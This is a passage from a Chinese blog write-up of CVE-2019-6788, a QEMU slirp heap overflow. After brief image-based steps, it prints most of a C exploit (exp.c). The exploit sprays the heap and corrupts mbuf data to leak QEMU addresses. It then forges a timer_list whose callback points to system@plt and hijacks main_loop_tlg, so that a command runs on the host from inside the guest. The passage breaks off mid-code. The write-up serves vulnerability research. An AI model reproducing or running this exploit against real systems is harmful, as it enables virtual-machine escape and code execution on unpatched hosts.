<li>定位有效地址</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/12.png" alt></p>
<ol start="7">
<li>伪造timer_list和timer</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/13.png" alt></p>
<p><img src="/2021/01/02/cve-2019-6788/14.png" alt></p>
<ol start="8">
<li>执行效果</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/7.png" alt></p>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>基本就是raycp师傅的代码，需要自己调试一下fake timer_list以及改system@plt地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; // close()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; // strcpy, memset(), and memcpy()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;      // struct addrinfo</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  // needed for socket(), uint8_t, uint16_t, uint32_t</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt; // needed for socket()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt; // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt; // struct ip and IP_MAXPACKET (which is 65535)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip_icmp.h&gt; // struct icmp, ICMP_ECHO</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FAVOR_BSD          <span class="comment">// Use BSD format of tcp header</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;     // struct tcphdr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;       // inet_pton() and inet_ntop()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;       // macro ioctl is defined</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/ioctls.h&gt;     // defines values for argument "request" of ioctl.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;          // struct ifreq</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;  // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt; // struct sockaddr_ll (see man 7 packet)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt; // gettimeofday()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt; // errno, perror()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some constants.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HDRLEN 14 <span class="comment">// Ethernet header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP4_HDRLEN 20 <span class="comment">// IPv4 header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TCP_HDRLEN 20 <span class="comment">// TCP header length, excludes options data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ICMP_HDRLEN 8 <span class="comment">// ICMP header length for echo request, excludes data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s:%d(): "</span> fmt, __func__, __LINE__, ##__VA_ARGS__);   \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char  g_interface[] = "ens2";</span></span><br><span class="line"><span class="keyword">char</span>  g_interface[] = <span class="string">"enp0s3"</span>;</span><br><span class="line"><span class="keyword">char</span> host[] = <span class="string">"10.0.2.2"</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span> *Slirp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_next</span>;</span> <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span> <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span> <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span> m_flags;            <span class="comment">/* Misc flags */</span></span><br><span class="line">    <span class="keyword">int</span> m_size;             <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line">    <span class="keyword">caddr_t</span> m_data; <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span> m_len;      <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span> resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span> *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span> m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some header info to pass to the send_ip_pkt</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_id;</span><br><span class="line">    <span class="keyword">uint16_t</span> ip_off;</span><br><span class="line">    <span class="keyword">bool</span> MF;</span><br><span class="line">    <span class="keyword">uint8_t</span> ip_p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">checksum</span><span class="params">(<span class="keyword">uint16_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">icmp4_checksum</span><span class="params">(struct icmp, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">tcp4_checksum</span><span class="params">(struct ip, struct tcphdr, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">allocate_ustrmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">uint16_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send_raw_pkt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> text_base, heap_base;</span><br><span class="line"><span class="keyword">uint16_t</span> g_spray_ip_id;</span><br><span class="line"><span class="keyword">int</span> stop_flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> eth_frame[] =</span><br><span class="line">        <span class="string">"\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00"</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"game start"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);</span><br><span class="line">    iphdr = (struct ip *)(buf + ETH_HDRLEN);</span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"10.0.2.15"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"10.0.2.2"</span>);</span><br><span class="line">    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    iphdr-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line">    iphdr-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这不需要htons，因为在ip_input里会转换一遍</span></span><br><span class="line">    iphdr-&gt;ip_len = (ICMP_HDRLEN);</span><br><span class="line">    iphdr-&gt;ip_id = (<span class="number">0xcdcd</span>);</span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    iphdr-&gt;ip_off = ((<span class="number">0</span> &lt;&lt; <span class="number">15</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">14</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">13</span>) + (<span class="number">0</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    iphdr-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line">    iphdr-&gt;ip_p = IPPROTO_ICMP;</span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != <span class="number">1</span> ||</span><br><span class="line">        (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    iphdr-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr-&gt;ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    icmphdr-&gt;icmp_type = ICMP_ECHO;</span><br><span class="line">    <span class="comment">// Message Code (8 bits): echo request</span></span><br><span class="line">    icmphdr-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Identifier (16 bits): usually pid of sending process - pick a number</span></span><br><span class="line">    icmphdr-&gt;icmp_id = htons(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// Sequence Number (16 bits): starts at 0</span></span><br><span class="line">    icmphdr-&gt;icmp_seq = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ICMP header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    <span class="comment">// TBD</span></span><br><span class="line">    <span class="comment">// icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen);</span></span><br><span class="line">    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//const char exec_cmd[] =</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//const char exec_cmd[] = "/snap/bin/gnome-calculator";</span></span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> exec_cmd[] = <span class="string">"/usr/bin/xcalc"</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd,<span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xaabb</span>;</span><br><span class="line">    arbitrary_write(</span><br><span class="line">        <span class="number">0x0b00</span>, <span class="number">3</span>, buf,</span><br><span class="line">        ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + <span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>, <span class="number">0x250</span>+<span class="number">0x50</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xbbaa</span>;</span><br><span class="line">    leak(<span class="number">0x0b00</span> + <span class="number">0x318</span> + <span class="number">0x14</span> + ETH_HDRLEN,</span><br><span class="line">         <span class="number">3</span>); <span class="comment">// reass处理完后会把m_data减掉ip头的长度</span></span><br><span class="line">    dbg_printf(<span class="string">"after leak"</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer_list</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)buf = text_base +  0x11e9040; // qemu_clocks</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = text_base +  <span class="number">0x12C3920</span>; <span class="comment">// qemu_clocks</span></span><br><span class="line">    <span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x30eeda</span>; <span class="comment">// qemu_timer_notify_cb</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">// end of timer_list</span></span><br><span class="line">    <span class="comment">// start of active_timers</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">    $49 = &#123;</span></span><br><span class="line"><span class="comment">        expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">        timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">        cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">        opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">        next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">        attributes = 0x0,</span></span><br><span class="line"><span class="comment">        scale = 0xf4240</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2be010</span>;    <span class="comment">// system plt</span></span><br><span class="line">    <span class="comment">//to verify</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe38</span> + <span class="number">0xa</span>; <span class="comment">// parameter address</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">    g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">    arbitrary_write(fake_timer_list - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">0xa0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have finished writing fake timer list.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    stop_flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// dbg_printf("check heap here");</span></span><br><span class="line">    <span class="comment">// qemu timer</span></span><br><span class="line">    <span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">    g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">    arbitrary_write(text_base + <span class="number">0x12C3900</span> - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">8</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have finished writing main_loop_tlg.\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"ama2in9"</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">"in leak_text...\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"0ops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">60000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]leaking: Now we have finished faking m_data.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">"trigger reass!"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"ama2in9"</span>, <span class="number">7</span>);</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]leaking: Now we have finished writting to target.\nAlso, this means we will get the response packet we want.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="keyword">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="keyword">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(struct timeval));</span><br><span class="line">    recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span 